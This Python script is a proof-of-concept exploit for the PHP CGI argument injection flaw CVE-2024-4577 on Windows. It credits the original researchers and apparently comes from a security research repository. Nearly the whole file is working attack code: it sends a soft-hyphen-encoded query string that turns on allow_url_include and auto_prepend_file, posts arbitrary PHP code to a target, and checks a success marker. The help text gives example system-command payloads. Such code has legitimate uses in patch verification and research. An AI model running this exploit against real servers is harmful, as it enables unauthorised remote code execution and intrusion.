#!/usr/bin/env python3
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Original vulnerability discovered by:
#  Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
#
# Original exploit by:
#  Aliz Hammond (@AlizTheHax0r), watchTowr
#  Sina Kheirkhah (@SinSinology), watchTowr
#
# Adapted and cleaned for repository by:
#  Hyperion Gray Security Research Team
#

"""
PHP CGI Argument Injection (CVE-2024-4577) Remote Code Execution PoC

This exploit targets a critical vulnerability in PHP's CGI mode on Windows systems.
The vulnerability allows remote code execution via argument injection through special
character encoding bypasses.

Affected versions:
- PHP 8.3 < 8.3.8
- PHP 8.2 < 8.2.20
- PHP 8.1 < 8.1.29
- PHP 8.0 and earlier (End-of-Life)

The exploit works by injecting PHP arguments through the URL query string using
Windows-specific character encoding (soft hyphen %AD) to bypass security filters.
"""

import argparse
import requests
import sys
import warnings

# Suppress SSL and deprecation warnings for cleaner output
warnings.filterwarnings("ignore", category=DeprecationWarning)
requests.packages.urllib3.disable_warnings()


def exploit_php_cgi(target_url, php_code):
    """
    Exploit CVE-2024-4577 to execute arbitrary PHP code.
    
    Args:
        target_url: The target PHP application URL
        php_code: The PHP code to execute on the target
        
    Returns:
        True if exploit succeeded, False otherwise
    """
    # Prepare the exploit payload
    # %AD is a soft hyphen character that bypasses filters on Windows
    # The payload enables allow_url_include and sets auto_prepend_file to php://input
    exploit_query = "?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
    
    # Append marker to verify successful execution
    payload = f"{php_code};echo 1337; die;"
    
    # Remove trailing slashes from target URL
    target = target_url.rstrip('/')
    full_url = f"{target}{exploit_query}"
    
    try:
        # Create session with SSL verification disabled
        session = requests.Session()
        session.verify = False
        
        # Send the exploit
        print(f"[*] Targeting: {target}")
        print(f"[*] Sending exploit payload...")
        
        response = session.post(full_url, data=payload, timeout=10)
        
        # Check for success marker in response
        if '1337' in response.text:
            print("[+] Exploit successful! Code executed on target.")
            print(f"[*] Response length: {len(response.text)} bytes")
            return True
        else:
            print("[-] Exploit may have failed - success marker not found")
            print(f"[*] Response status: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during exploitation: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description='CVE-2024-4577 PHP CGI Argument Injection RCE Exploit',
        epilog='Example: python exploit.py -t http://target.com/index.php -c "<?php system(\'whoami\'); ?>"'
    )
    
    parser.add_argument(
        '-t', '--target',
        required=True,
        help='Target URL (e.g., http://192.168.1.1/index.php)'
    )
    
    parser.add_argument(
        '-c', '--code',
        required=True,
        help='PHP code to execute (e.g., "<?php system(\'whoami\'); ?>")'
    )
    
    args = parser.parse_args()
    
    print("\n" + "="*70)
    print("  CVE-2024-4577: PHP CGI Argument Injection RCE Exploit")
    print("  Original discovery: Orange Tsai (@orange_8361) of DEVCORE")
    print("="*70 + "\n")
    
    # Execute the exploit
    success = exploit_php_cgi(args.target, args.code)
    
    # Exit with appropriate status code
    sys.exit(0 if success else 1)


if __name__ == '__main__':
    main()
